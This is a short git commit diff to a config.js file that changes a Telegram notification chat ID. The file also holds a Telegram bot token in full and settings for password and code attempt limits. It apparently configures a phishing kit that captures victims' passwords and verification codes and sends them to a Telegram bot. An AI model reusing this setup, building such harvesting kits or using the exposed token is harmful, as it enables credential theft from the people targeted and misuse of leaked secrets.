8c64b5e0762f8394f3ce4cac8b65905ff3eb3df5
QuanHoan965 <urf9001@gmail.com>
2025-09-04 15:20:20 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -2,7 +2,7 @@ const config = {
     token: '7669098850:AAFkB5IGIn8fK-pd086C9zjBtFvKWmTnGRo',
     chat_id: '1922578871',
     noti_token: '7669098850:AAFkB5IGIn8fK-pd086C9zjBtFvKWmTnGRo',
-    noti_chat_id: '4786567012',
+    noti_chat_id: '6928425325',
     max_password_attempts: 2,
     max_code_attempts: 5,
     password_loading_time: 5,
